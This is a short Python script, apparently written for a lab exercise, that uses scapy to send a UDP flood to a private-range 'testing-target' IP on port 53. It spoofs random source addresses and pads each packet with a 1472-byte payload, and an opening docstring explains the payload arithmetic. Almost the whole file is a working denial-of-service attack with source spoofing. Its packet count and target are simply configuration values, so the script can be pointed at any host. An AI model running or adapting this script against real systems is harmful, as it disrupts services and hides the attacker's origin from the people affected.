"""

For the UDP flood, it is described by the target server receiving massive volumes of large UDP packets.
UDP is connectionless, so the target server must accept all incoming traffic.

We need to calculate payload size:

We find from the scapy documentation, an empty UDP packet is 28 bytes.

Standard Ethernet MTU: 1500 bytes
IP header: 20 bytes
UDP header: 8bytes

so our payload to fit in a single UDP packet without IP fragmentation has to be:
1500 - 28 = 1472 bytes

"""

from scapy.all import UDP, IP, send, Raw
import random

# Config information:
dest_ip = "192.168.168.10" # testing-target ip
dest_port = 53
num_packets = 100 # number of packets to send
payload_size = 1472

def random_ip():
    temp =[]
    for i in range(4):
        temp.append(str(random.randint(1, 254)))
    ip = ".".join(temp)
    return ip

def main():
    print(f"Starting UDP flood: \nSending {num_packets} to {dest_ip}:{dest_port}")

    for i in range(num_packets):
        spoof_ip = random_ip()

        packet = IP(src=spoof_ip, dst=dest_ip)/ UDP(
            dport=dest_port
        )/Raw(load="A"*payload_size)

        send(packet, verbose=0)

    print(f"\nPackets sent successfully. Sent {num_packets} UDP packets.")


if __name__ == "__main__":
    main()